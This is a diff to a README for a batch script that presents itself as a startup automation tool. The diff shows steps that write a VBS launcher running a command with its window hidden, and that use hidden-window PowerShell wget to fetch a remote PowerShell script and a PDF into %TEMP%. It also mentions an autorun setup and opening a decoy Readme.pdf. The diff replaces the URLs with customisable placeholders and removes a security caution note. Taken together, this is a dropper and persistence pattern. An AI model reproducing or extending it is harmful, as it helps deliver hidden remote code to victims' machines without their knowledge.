@@ -17,10 +17,14 @@ This batch script, is designed to automate certain tasks during system startup b
      echo shell.Run command,0 >>run.vbs
      ```
 
-   - Download the PowerShell script (`script.ps1`) and the PDF file (`document.pdf`) from specified URLs using PowerShell:
+   - Download the PowerShell script (`script.ps1`) from your desired URL using PowerShell:
      ```batch
-     powershell.exe -WindowStyle hidden wget https://site.com/script.ps1 -OutFile %TEMP%\script.ps1
-     powershell.exe -WindowStyle hidden wget https://site.com/document.pdf -OutFile %TEMP%\document.pdf
+     powershell.exe -WindowStyle hidden wget <your_script_url> -OutFile %TEMP%\script.ps1
+     ```
+
+   - Download other necessary files similarly, e.g., a PDF document:
+     ```batch
+     powershell.exe -WindowStyle hidden wget <your_pdf_url> -OutFile %TEMP%\document.pdf
      ```
 
 2. **Setting up Autorun:**
@@ -50,6 +54,7 @@ This batch script, is designed to automate certain tasks during system startup b
      start /max Readme.pdf
      ```
 
-## Note
+## Customization
 
-Please exercise caution when using scripts downloaded from the internet. Ensure that the source is trustworthy and the scripts are safe and intended for your use. Always prioritize security and best practices while automating tasks.
+- You can customize the URLs to download the PowerShell script and other files by replacing `<your_script_url>` and `<your_pdf_url>` with your desired URLs.
+
